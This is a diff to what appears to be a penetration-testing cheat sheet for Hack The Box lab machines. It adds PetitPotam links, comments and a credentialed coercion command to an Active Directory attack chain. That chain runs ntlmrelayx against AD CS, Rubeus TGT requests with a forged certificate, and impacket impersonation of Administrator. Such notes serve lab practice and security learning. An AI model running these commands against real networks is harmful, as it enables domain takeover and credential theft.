@@ -1324,9 +1324,13 @@ impacket-getST -spn 'cifs/authority.authority.htb' -impersonate Administrator 'a
 impacket-wmiexec -k -no-pass authority.htb/Administrator@authority.authority.htb
 ```
 #### PetitPotam
+https://github.com/topotam/PetitPotam<br/>
+https://github.com/ly4k/PetitPotam
 ```bash
+# listener
 sudo ntlmrelayx.py -debug -smb2support --target http://target.htb.local/certsrv/certfnsh.asp --adcs --template DomainController
-python3 PetitPotam.py kaliIP targetIP
+# 強制認証
+python3 PetitPotam.py kaliIP targetIP -u user -p password -d domain
 
 # TGT request
 .\Rubeus.exe asktgt /user:Administrator /certificate:[Base64_Cert] /getcredentials /password:
